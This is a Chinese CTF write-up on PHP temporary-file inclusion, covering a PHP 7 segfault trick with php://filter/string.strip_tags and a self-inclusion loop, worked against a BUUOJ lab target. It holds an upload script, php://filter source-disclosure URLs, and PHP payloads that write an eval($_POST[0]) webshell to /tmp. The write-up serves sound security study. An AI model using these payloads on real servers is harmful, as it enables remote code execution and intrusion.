-<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出，临时文件就不会被删除。</p>
-<p>在php7中</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/string.strip_tags=/etc/passwd</span></span><br></pre></td></tr></table></figure>
-
-<p>会造成段错误。 </p>
-<p>适用版本： </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</span><br><span class="line">php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</span><br><span class="line">php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</span><br></pre></td></tr></table></figure>
-
-<h4 id="实列及详解"><a href="#实列及详解" class="headerlink" title="实列及详解"></a>实列及详解</h4><p>查看网页源代码，发现提示信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username/password error&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>传递name参数，用burp抓包并发送到repeater模块</p>
-<p><img src="https://s2.loli.net/2023/11/18/y9SgG3NDnjQacIB.png" alt="image-20231025161936687"></p>
-<p><img src="https://s2.loli.net/2023/11/18/oQL6JwPxvsfSk4a.png" alt="image-20231025161900649"></p>
-<p>经过测试，发现改变name的值，响应包中Hash值会响应改变（name和hash一一对应），结合提示，可以传入pass参数，值为响应包中的Hash值（name值和pass值要相对应）。</p>
-<p><img src="https://s2.loli.net/2023/11/18/IDOkeyP7MNYGdKZ.png" alt="image-20231025162123175"></p>
-<p>在响应包中发现提示文件：<code>flflflflag.php</code>，访问该文件</p>
-<p><img src="https://s2.loli.net/2023/11/18/mxInGt6O72psNyY.png" alt="image-20231025162404641"></p>
-<p>发现文件包含，猜测可能是文件包含漏洞，可以查看源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</span><br></pre></td></tr></table></figure>
-
-<p>用BurpSuite拦截响应，base64解码后得到源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">	die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用目录扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
-
-<p>扫描发现dir.php。</p>
-<p><img src="https://s2.loli.net/2023/11/18/ruxOEn2CovHcR5U.png" alt="image-20231025165147270"></p>
-<p><img src="https://s2.loli.net/2023/11/18/ULTyQMfe9zqj4VW.png" alt="image-20231025165242501"></p>
-<p>访问dir.php文件：</p>
-<p><img src="https://s2.loli.net/2023/11/18/o7rUlwePmHFVIqA.png" alt="image-20231025163132883"></p>
-<p>查看dir.php源代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>
-
-<p>用Burpsuite拦截响应，base64解码后源代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。</p>
-<p>该题存在文件包含，而且可以显示临时文件夹（&#x2F;tmp）的内容，因此可以考虑临时文件包含的方法解题。同时，根据响应包中内容：<code>X-Powered-By: PHP/7.0.33</code>，说明php版本存在段错误。</p>
-<p>编写python脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO </span><br><span class="line"><span class="comment">#BytesIO实现了在内存中读写bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> </span><br><span class="line"><span class="comment">#注入的恶意命令</span></span><br><span class="line"><span class="comment">#payload=&quot;&lt;?php echo 12;fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo 1234;eval($_POST[0]);?&gt;&#x27;);?&gt;&quot; </span></span><br><span class="line"><span class="comment">#把一句话木马写入shell.php</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://c7e65748-3412-4257-9224-6c01808f5a20.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<p>执行该脚本后，payload就注入到临时文件了。</p>
-<p>再次访问dir.php文件，得到tmp目录下刚刚我们上传的文件路径：&#x2F;tmp&#x2F;phpVvvefu</p>
-<p><img src="https://s2.loli.net/2023/11/18/jymveQM7NRstuDc.png" alt="image-20231025164408642"></p>
-<p>利用BurpSuite发送请求，由于本题的flag在<code>phpinfo()</code>中，因此这样就能得到flag：</p>
-<p><img src="https://s2.loli.net/2023/11/18/d5BhRK1X6Tgta9m.png" alt="image-20231025164751449"></p>
-<h3 id="自包含"><a href="#自包含" class="headerlink" title="自包含"></a>自包含</h3><p>自己包含自己，进入死循环，脚本永不结束，也就不会删除临时文件。</p>
-<p>文件上传，phpinfo，自包含三者缺一不可，在同一个页面发生。</p>
-<p>题目源码（文件位于<code>index.php</code>）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$page</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>如果将<code>page</code>赋值为<code>index.php</code>，就会开始自包含。</p>
-<p>然后对死循环发送POST请求，此时POST请求对应的临时文件才不会被清理。</p>
-<p>创建上传表单（<code>untitled.html</code>）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://url/?page=index.php&amp;info&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt; </span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>创建上传文件（<code>1.txt</code>）：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>); </span><br><span class="line">    <span class="comment"># 123用于检查是否上传成功</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo(&#x27;</span><span class="number">1234</span><span class="string">&#x27;); eval($_POST[0]);?&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment"># 1234用于检查是否执行成功</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意，如果循环次数过多会导致电脑死机，所以不建议长时间循环，最好的方式是包含后就生成一个永久的shell，一包含到就可以结束自包含。</p>
-<p>打开上传表单，并上传</p>
-<p>上传成功后找到路径</p>
-<p><img src="https://s2.loli.net/2023/11/18/uSEZL1jxi2TqfCM.png" alt="image-20231025195150883"></p>
-<p>包含</p>
-<p><img src="https://s2.loli.net/2024/04/02/pd4ScAFLP7ThWr6.png" alt="8hvtMaESITi7Jd4"></p>
-<p>输出 123 表示 1.txt 文件上传成功</p>
-<p>关闭循环，找到木马文件路径</p>
-<p><img src="https://s2.loli.net/2024/04/02/xgThuJoaliAfBV3.png" alt="nUJworM2IdKe4Eu"></p>
-<p>输出 1234 表示一句话木马执行成功。接下来连蚁剑，找 flag。</p>
 ]]></content>
       <categories>
         <category>文件包含</category>
